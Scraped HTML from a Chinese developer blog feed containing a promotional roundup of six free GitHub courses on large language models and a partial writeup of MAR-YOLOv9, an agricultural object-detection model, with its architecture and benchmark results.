blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">智泊AI</a>。</p>
</blockquote>
<p>过去几年，AI 尤其是大语言模型（LLM）发展太快了，不少朋友问我：</p>
<blockquote>
<p>★“零基础可以学 AI 吗？” “ChatGPT 背后是怎么工作的？” “我不是算法专家，还有机会入行吗？”</p>
</blockquote>
<p>其实，AI 正在变得越来越亲民，尤其是这些年开源社区贡献了大量<strong>免费的高质量学习资源</strong>，不管你是零基础小白，还是想往工程应用方向转型的开发者，都可以找到合适的路径。</p>
<p>今天我就从专业角度出发，给大家精挑细选了 6 个在 GitHub 上“狂飙”的 AI 教程项目，不仅实用、完整、还都是<strong>免费开源的！</strong></p>
<hr/>
<h2 data-id="heading-0">微软出品入门课：Generative AI for Beginners</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/31272be68deb49b1a95d168d14dc490a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442217&amp;x-signature=byIC0%2BgphWGw%2BeJd1Ycd%2BHigy44%3D" alt="" loading="lazy"/></p>
<p>👉 Star 数：91.9k </p>
<p>📎 GitHub地址：(<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmicrosoft%2Fgenerative-ai-for-beginners" target="_blank" title="https://github.com/microsoft/generative-ai-for-beginners" ref="nofollow noopener noreferrer">github.com/microsoft/g…</a>)</p>
<p>微软专为零基础用户打造的生成式 AI 入门课程，讲得清晰又实用，连编程都可以不会！</p>
<p>推荐理由：</p>
<p>内容涵盖 LLM、提示词设计、文本生成等关键技能。带你动手构建聊天机器人、智能客服等应用。没有基础也能学，真·新手福音，还有 Azure 云服务工具链教学。</p>
<p>🧩 适合谁：刚接触 AI、想系统入门、希望动手做点有趣东西的人。</p>
<hr/>
<h2 data-id="heading-1">最系统进阶课程：LLM-Course</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5b36c00975ba4b598aa586b7e0b093ae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442217&amp;x-signature=v3TIFG8jwK3exO4EGEbiHn2VnPA%3D" alt="" loading="lazy"/></p>
<p>👉 Star 数：57.5k+ 📎 GitHub地址：(<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmlabonne%2Fllm-course" target="_blank" title="https://github.com/mlabonne/llm-course" ref="nofollow noopener noreferrer">github.com/mlabonne/ll…</a>)</p>
<p>这是目前最受欢迎的大语言模型进阶课程之一，内容深入但不难啃，附带大量 Colab 笔记本可以直接跑。</p>
<p>推荐理由：</p>
<p>教你从架构原理 → 微调方法 → 工程部署全流程。理论+实战结合，包含 RLHF、量化、MoE 等新技术，适合边学边做项目。</p>
<p>🧩 适合谁：有一定编程基础，想掌握 LLM 全套能力的开发者或产品经理。</p>
<hr/>
<h2 data-id="heading-2">中文环境友好教程：LLM Cookbook</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fe096e0c4f1e424fa5356755e562a66e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442217&amp;x-signature=7fYVjuCf4FTbiBfHXgsNjgFo9l8%3D" alt="" loading="lazy"/></p>
<p>👉 Star 数：20.4k 📎 GitHub地址：(<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdatawhalechina%2Fllm-cookbook" target="_blank" title="https://github.com/datawhalechina/llm-cookbook" ref="nofollow noopener noreferrer">github.com/datawhalech…</a>)</p>
<p>由国内团队 Datawhale 打造的本地化教程，翻译并优化了吴恩达与 OpenAI 的经典课程，中文环境下非常友好。</p>
<p>推荐理由：</p>
<p>内容系统、语言亲切、无需翻墙、不需要英文基础，中文社区维护更适合国内用户。</p>
<p>🧩 适合谁：不习惯英文教学，想用中文系统学习 LLM 应用的朋友。</p>
<hr/>
<h2 data-id="heading-3">工程部署实战指南：LLM Action</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/50dcab0b922343a2b199e958734686d9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442217&amp;x-signature=lF9V%2FFw7IsbDYIWDAWe82bLieDo%3D" alt="" loading="lazy"/></p>
<p>👉 Star 数：19.5k 📎 GitHub地址：(<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fliguodongiot%2Fllm-action" target="_blank" title="https://github.com/liguodongiot/llm-action" ref="nofollow noopener noreferrer">github.com/liguodongio…</a>)</p>
<p>这个项目对我最大的吸引力是它的“工程实战”定位，不再停留在理论，而是手把手带你部署真正能跑的大模型项目。</p>
<p>推荐理由：</p>
<p>涵盖 LoRA、P-Tuning 微调、分布式训练，教你如何集成 LangChain、如何部署 Demo。文档齐全，代码结构清晰，落地性强。</p>
<p>🧩 适合谁：已有项目经验，想把 AI 真正上线、部署实用的开发者。</p>
<hr/>
<h2 data-id="heading-4">轻量训练利器：MiniMind</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bb836fefbb65403cbcc1afa793f198c3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442217&amp;x-signature=Kvp6M%2FBPD%2BArKXFbRe8m8J3BeFA%3D" alt="" loading="lazy"/></p>
<p>👉 Star 数：23.1k 📎 GitHub地址：(<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fjingyaogong%2Fminimind" target="_blank" title="https://github.com/jingyaogong/minimind" ref="nofollow noopener noreferrer">github.com/jingyaogong…</a>)</p>
<p>这个项目能让你用一张 2G 显卡，从零训练出一个小型的大语言模型！</p>
<p>推荐理由：</p>
<p>模型仅 26M 参数，训练推理速度快，非常适合了解 LLM 从 0 到 1 的训练流程，入门理解底层架构的好工具。</p>
<p>🧩 适合谁：对模型原理、底层机制感兴趣，想亲手训练模型的AI极客。</p>
<hr/>
<h2 data-id="heading-5">全链路项目式教程：LLM-Universe</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/333171d667154244a92038212601dd8e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442217&amp;x-signature=sO9sb55zmDYvQTco2OYh04O4vrU%3D" alt="" loading="lazy"/></p>
<p>👉 Star 数：9.1k 📎 GitHub地址：(<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdatawhalechina%2Fllm-universe" target="_blank" title="https://github.com/datawhalechina/llm-universe" ref="nofollow noopener noreferrer">github.com/datawhalech…</a>)</p>
<p>又一个由 Datawhale 出品的实战型教程，从“构建个人知识助手”这个项目切入，带你完成一个完整的 LLM 应用闭环。</p>
<p>推荐理由：</p>
<p>从基础到部署全流程覆盖：RAG、提示工程、微调。环境配置详尽，适合边看边学。每一章都贴合实际项目，学完立马能用。</p>
<p>🧩 适合谁：希望快速掌握 LLM 应用开发的朋友，尤其是零基础想做项目的同学。</p>
<hr/>
<h2 data-id="heading-6">🧭 学习路径建议（按阶段推荐）</h2>

























<table><thead><tr><th>当前阶段</th><th>推荐教程</th></tr></thead><tbody><tr><td>完全零基础</td><td>Generative AI for Beginners</td></tr><tr><td>有点基础，想深入</td><td>LLM-Course、LLM Cookbook</td></tr><tr><td>想做实战部署</td><td>LLM Action、LLM-Universe</td></tr><tr><td>对训练感兴趣</td><td>MiniMind</td></tr></tbody></table>
<pre><code class="hljs language-rust" lang="rust">🔰 零基础入门阶段  
└── 🟢 Generative AI <span class="hljs-keyword">for</span> <span class="hljs-title class_">Beginners</span>  
  
📘 理论进阶阶段  
├── 🟡 LLM-Course  
└── 🟡 LLM Cookbook（中文）  
  
💻 项目实战阶段  
├── 🔵 LLM-Universe（从<span class="hljs-number">0</span>构建应用）  
└── 🔵 LLM Action（工程级部署实战）  
  
⚙️ 模型训练阶段  
└── 🔴 MiniMind（从<span class="hljs-number">0</span>训练大模型）
</code></pre>
<hr/>
<h2 data-id="heading-7">✍️写在最后</h2>
<p>AI 的世界很大，但入门的第一步，其实并不难。 这 6 个开源项目，不仅代表了当前 LLM 教学的最前沿水平，也展示了社区学习的力量。</p>
<p>不用担心基础、不用害怕技术，关键是 <strong>开始动手，持续学习</strong>。 每个优秀的 AI 工程师，都是从“不会”开始的。</p>
<p><strong>如果你对大模型教程感兴趣，已经整理打包了赶紧</strong> <em>点击文末入手吧！</em></p>
<h2 data-id="heading-8">学习资源推荐</h2>
<p>如果你想更深入地学习大模型，以下是一些非常有价值的学习资源，这些资源将帮助你从不同角度学习大模型，提升你的实践能力。</p>
<blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">智泊AI</a>。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MAR-YOLOv9：革新农业检测，YOLOv9的“低调”逆袭]]></title>    <link>https://juejin.cn/post/7579819594270523430</link>    <guid>https://juejin.cn/post/7579819594270523430</guid>    <pubDate>2025-12-04T08:38:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579819594270523430" data-draft-id="7579673620957904942" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MAR-YOLOv9：革新农业检测，YOLOv9的“低调”逆袭"/> <meta itemprop="keywords" content="算法,计算机视觉,深度学习"/> <meta itemprop="datePublished" content="2025-12-04T08:38:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="CoovallyAIHub"/> <meta itemprop="url" content="https://juejin.cn/user/2461151071843739"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MAR-YOLOv9：革新农业检测，YOLOv9的“低调”逆袭
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2461151071843739/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    CoovallyAIHub
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T08:38:57.000Z" title="Thu Dec 04 2025 08:38:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在YOLO系列的演进长河中，YOLOv8以其出色的平衡性赢得了广泛关注，YOLOv10和v11也紧随其后带来新的优化。然而，YOLOv9——这个介于v8与v10之间的版本，却似乎略显低调，未能获得同等的讨论热度。</p>
<p>但技术的价值从不取决于曝光度。今天，我们要为大家详细介绍一项基于YOLOv9的重要创新：多适应识别YOLOv9（MAR-YOLOv9）。这是一种专门为农业领域设计的轻量级跨数据集增强目标检测方法，它不仅在YOLOv9的基础上实现了显著突破，更在复杂多变的农业场景中展现出了令人瞩目的性能表现。</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/67d3f268c0494cc6a3a18d3dd48586c3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442337&amp;x-signature=prh7%2FavKk5lPTGVqChwfgJh%2FjvA%3D" alt="图片1.png" loading="lazy"/></p>
<p>随着深度学习技术的发展，目标检测已广泛应用于各个领域。然而，在跨数据集目标检测中，传统的深度学习模型常常面临性能下降的问题。这在农业领域尤为突出，因为农业领域作物种类繁多，环境复杂多变。现有技术在处理多样化场景时仍然面临性能瓶颈。为了解决这些问题，本研究提出了一种基于YOLOv9的轻量级、跨数据集增强的农业领域目标检测方法，命名为多适应性识别-YOLOv9（MAR-YOLOv9）。该方法优化了传统的32倍下采样骨干网络，并创新性地设计了16倍下采样骨干网络。此外，还引入了更精简、更轻量级的主颈结构，以及创新的特征提取、上采样和连接方法。这种混合连接策略使得模型能够灵活地利用不同层级的特征。 MAR-YOLOv9解决了传统YOLOv9中由于检测颈部和辅助分支结构导致的训练时间过长和权重冗余问题，使其能够在保持高性能的同时降低模型的计算复杂度并提高检测速度，从而更适用于实时检测任务。在四个植物数据集的对比实验中，MAR-YOLOv9的mAP@0.5精度相比七种主流目标检测算法提高了39.18%，相比YOLOv9模型提高了1.28%。同时，模型规模缩小了9.3%，模型层数也减少了，从而降低了计算成本和存储需求。此外，MAR-YOLOv9在检测复杂农业图像方面也展现出显著优势，为农业领域的目标检测任务提供了一种高效、轻量级且适应性强的解决方案。</p>
<p>相关数据和代码可通过以下链接获取：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FYangxuWangamI%2FMAR-YOLOv9" target="_blank" title="https://github.com/YangxuWangamI/MAR-YOLOv9" ref="nofollow noopener noreferrer">github.com/YangxuWanga…</a></p>
<h2 data-id="heading-0"><strong>农业目标检测的独特挑战</strong></h2>
<p>农业领域的目标检测任务具有其特殊性：</p>
<ul>
<li><strong>作物多样性：</strong> 不同作物的外观、形态、颜色差异巨大</li>
<li><strong>环境复杂：</strong> 光照变化、天气条件、拍摄角度等因素影响图像质量</li>
<li><strong>尺度多变：</strong> 同一种作物在不同生长阶段尺寸差异显著</li>
<li><strong>遮挡严重：</strong> 叶片、茎秆相互遮挡，目标可见性差</li>
<li><strong>实时性要求：</strong> 农业应用往往需要部署在资源有限的设备上</li>
</ul>
<p>这些特点使得通用目标检测模型在农业场景中难以发挥最佳性能，迫切需要针对性的优化方案。</p>
<h2 data-id="heading-1"><strong>MAR-YOLOv9：专为农业设计的轻量级解决方案</strong></h2>
<p>为了应对上述挑战，我们提出了多适应识别YOLOv9（MAR-YOLOv9）——一种基于YOLOv9的农业领域轻量级跨数据集增强目标检测方法。</p>
<ul>
<li><strong>核心创新点</strong></li>
</ul>

<ul>
<li>
<p>16倍下采样骨干网络</p>
<p>传统YOLOv9采用32倍下采样，可能会丢失细节信息</p>
<p>MAR-YOLOv9创新性地设计了16倍下采样骨干网络</p>
<p>在降低计算复杂度的同时，保留了更多关键特征信息</p>
</li>
<li>
<p>精简轻量的主颈部结构</p>
<p>优化了特征提取、上采样和拼接连接策略</p>
<p>采用混合连接策略，灵活利用不同层级特征</p>
<p>解决了传统YOLOv9中检测颈部和辅助分支导致的训练时间增加、权重冗余问题</p>
</li>
<li>
<p>双路径检测架构</p>
<p>主检测分支：负责主要特征提取和目标检测</p>
<p>辅助检测分支：通过可逆辅助设计，增强小目标检测能力</p>
<p>CBLinear和CBFuse模块实现多路径特征传递，有效解决信息损失问题</p>
</li>
</ul>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ce8f961cee2a4dd28ba0333f34b79a31~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442337&amp;x-signature=xizhTMGVkcDaCX8H6oYXJN1I%2B3I%3D" alt="图片2.png" loading="lazy"/></p>
<ul>
<li><strong>关键技术模块</strong></li>
</ul>

<ul>
<li>RepNCSPELAN4模块：增强特征表达能力</li>
<li>CBLinear模块：多路径特征提取器</li>
<li>Adown模块：高效下采样设计</li>
<li>激活函数选择：采用SiLU激活函数，平衡梯度流动和计算</li>
</ul>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c30ff0d2f72461895a47dec9289583f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442337&amp;x-signature=3RVID9xxK4Q%2FUKjRxcRKtVFjFwQ%3D" alt="journal.pone.0307643.g002.PNG" loading="lazy"/></p>
<h2 data-id="heading-2"><strong>实验验证：四大数据集全面评测</strong></h2>
<p>我们在四个具有代表性的植物数据集上进行了全面评估：</p>
<ul>
<li><strong>数据集介绍</strong></li>
</ul>

<ul>
<li>MTDC-UAV数据集：玉米雄穗检测与计数无人机数据集</li>
<li>WEDU数据集：小麦穗检测更新版数据集</li>
<li>RFRB数据集：油菜花花矩形框标记数据集</li>
<li>DRPD数据集：水稻穗多样性检测数据集</li>
</ul>
<p>这些数据集涵盖了不同的植物种类、生长环境、图像质量和目标密度，能够全面评估模型的泛化能力。</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/59e5b5dc2b8e4b73878fa6bd74561fc6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442337&amp;x-signature=m9xO%2FboLcQ%2BeelvQvdMIc2Nn5Zg%3D" alt="图片4.png" loading="lazy"/></p>
<ul>
<li><strong>性能对比</strong></li>
</ul>
<p>与七种主流目标检测算法（CenterNet、Faster R-CNN、EfficientDet、DETR、FCOS、SSD、YOLOv8）相比：</p>
<ul>
<li>平均mAP@0.5提升39.18%</li>
<li>相比YOLOv9，精度提升1.28%</li>
<li>模型体积减小9.3%</li>
<li>层数减少，计算成本降低</li>
</ul>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51d1dd01e2a841d281f5fb74583b223c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442337&amp;x-signature=sGoSz0vm7nkbZYRAToZr8yFfh7Q%3D" alt="图片5.png" loading="lazy"/></p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f80e07a68590448b9e43b9a5857e06a0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442337&amp;x-signature=KaCTS03H1lECxH8pp4YPRGZNZX4%3D" alt="图片6.png" loading="lazy"/></p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b72eee9dfb0e4453a0c91dfb815d3469~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442337&amp;x-signature=MqmCe5Ado0ypT546mNYiMrXBc28%3D" alt="图片7.png" loading="lazy"/></p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5dcc2bb989b344feb673ce5b3661a12a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442337&amp;x-signature=JAx828NKjW9yaqLveUxcvlwyLJU%3D" alt="图片8.png" loading="lazy"/></p>
<h2 data-id="heading-3"><strong>可视化分析：更精准的检测效果</strong></h2>
<p>通过对比YOLOv9和MAR-YOLOv9的可视化结果，我们可以直观地看到改进效果：</p>
<ul>
<li><strong>小目标检测提升</strong></li>
</ul>
<p>在密集种植场景中，MAR-YOLOv9能够更准确地检测小尺寸的作物目标，减少漏检。</p>
<ul>
<li><strong>遮挡处理优化</strong></li>
</ul>
<p>面对叶片遮挡严重的场景，MAR-YOLOv9表现出更好的鲁棒性，能够识别部分可见的目标。</p>
<ul>
<li><strong>复杂背景适应</strong></li>
</ul>
<p>在背景杂乱、光照不均的条件下，MAR-YOLOv9的误检率显著降低。</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/abf8ee5189e34506a560c5b2fc2ce306~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442337&amp;x-signature=pu9fUzRvW4qhSSyuJeVIjRGzr5Q%3D" alt="图片9.png" loading="lazy"/></p>
